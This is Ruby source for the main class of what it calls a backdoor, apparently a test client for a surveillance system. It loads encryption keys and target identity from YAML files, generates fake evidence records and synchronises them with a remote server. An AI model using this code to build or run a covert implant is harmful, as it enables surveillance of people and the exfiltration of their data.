#
#  The main file of the backdoor
#

# relatives
require_relative 'sync.rb'
require_relative 'protocol.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/crypt'
require 'rcs-common/evidence'

# from System
require 'digest/md5'
require 'ostruct'
require 'yaml'
require 'optparse'

module RCS
module Backdoor
#
# This is the Backdoor object
# it needs the backdoor_id, instance and conf_key to be created
# all those parameters need to be passed as string taken from the db
#

class Backdoor
  include Tracer
  
  attr_reader :id
  attr_reader :instance
  attr_reader :type
  attr_reader :conf_key
  attr_reader :log_key
  attr_reader :signature
  attr_reader :version
  
  attr_reader :userid
  attr_reader :deviceid
  attr_reader :sourceid
  
  attr_reader :evidences
  
  #setup all the backdoor parameters
  def initialize(binary_file, ident_file)

    binary = {}

    trace :debug, "Parsing binary data..."
    
    # parse the parameters from the binary patched constants
    begin
      File.open(binary_file, "r") do |f|
        binary = YAML.load(f.read)
      end
    rescue
      trace :fatal, "Cannot open binary patched file"
      exit
    end

    # instantiate le empty log queue
    @evidences = []
    
    # plain string 'RCS_000000000x'
    @id = binary['BACKDOOR_ID']

    # the subtype of the backdoor (eg: WIN32, BLACKBERRY...)
    @type = binary['BACKDOOR_TYPE']
    
    # the conf key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    @conf_key = Digest::MD5.digest binary['CONF_KEY']
    
    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    @log_key = Digest::MD5.digest binary['LOG_KEY']
    
    # the backdoor signature is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    @signature = Digest::MD5.digest binary['SIGNATURE']
    
    # the backdoor version
    @version = binary['VERSION']
    
    # STUB ! (move to another place) used to identify the target
    ident = {}

    begin
      File.open(ident_file, "r") do |f|
        ident = YAML.load(f.read)
      end
    rescue
      trace :fatal, "Cannot open binary patched file"
      exit
    end
    # the instance is passed as a string taken from the db
    # we need to convert to binary
    @instance = [ident['INSTANCE_ID']].pack('H*')

    @userid = ident['USERID'] || ''
    @deviceid = ident['DEVICEID'] || ''
    @sourceid = ident['SOURCEID'] || ''

    trace :debug, "Backdoor instantiated: " << @id << @instance.unpack('H*').to_s

    begin
      # instantiate the sync object with the protocol to be used
      # and a reference to the backdoor
      @sync = Sync.new(:REST, self)
    rescue Exception => detail
      trace :fatal, "ERROR: " << detail.to_s
      raise
    end
  end
  
  # perform the synchronization with the server
  def sync(host)
    @sync.perform host
  end
  
  # create some evidences
  def create_evidences(num, type = :RANDOM)
    info = { :log_key => @log_key, :device_id => @deviceid, :user_id => @userid, :source_id => @sourceid }
    num.times do
      @evidences << Evidence.new(info).generate(type)
    end
  end
end

# this module is used only form bin/rcs-backdoor as a wrapper to
# execute the backdoor from command line
class Application
  include RCS::Tracer

  def run(options)

    # if we can't find the trace config file, default to the system one
    if File.exist?('trace.yaml') then
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__))) + "/bin"
      ty = typ + "/trace.yaml"
      puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end
    
    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end

    begin
      trace :info, "Creating the backdoor..."
      b = RCS::Backdoor::Backdoor.new 'binary.yaml', 'ident.yaml'

      if options[:generate] then
          trace :info, "Creating #{options[:gen_num]} fake evidences..."
          b.create_evidences(options[:gen_num], options[:gen_type])
      end

      if options[:sync] then
          trace :info, "Synchronizing..."
          b.sync options[:sync_host]
      end

    rescue Exception => detail
      trace :fatal, "FAILURE: " << detail.to_s
      return 1
    end

    # concluded successfully
    return 0
  end

  # since we cannot use trace from a class method
  # we instantiate here an object and run it
  def self.run!(*argv)
    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}

    optparse = OptionParser.new do |opts|
      # Set a banner, displayed at the top of the help screen.
      opts.banner = "Usage: rcs-backdoor [options] arg1 arg2 ..."

      # Define the options, and what they do
      opts.on( '-g', '--generate NUM', Integer, 'Generate NUM evidences' ) do |num|
        options[:generate] = true
        options[:gen_num] = num
      end
      opts.on( '-t', '--type TYPE', [:RANDOM, :DEVICE, :CALL], 'Generate evidences of type TYPE' ) do |type|
        options[:gen_type] = type
      end
      opts.on( '-s', '--sync HOST', 'Synchronize with remote HOST' ) do |host|
        options[:sync] = true
        options[:sync_host] = host
      end

      # This displays the help screen, all programs are assumed to have this option.
      opts.on( '-h', '--help', 'Display this screen' ) do
        puts opts
        exit
      end
    end

    optparse.parse(argv)

    return Application.new.run(options)
  end

end # Application::

end # Backdoor::
end # RCS::

if __FILE__ == $0
  RCS::Backdoor::Application.run!(*ARGV)
end
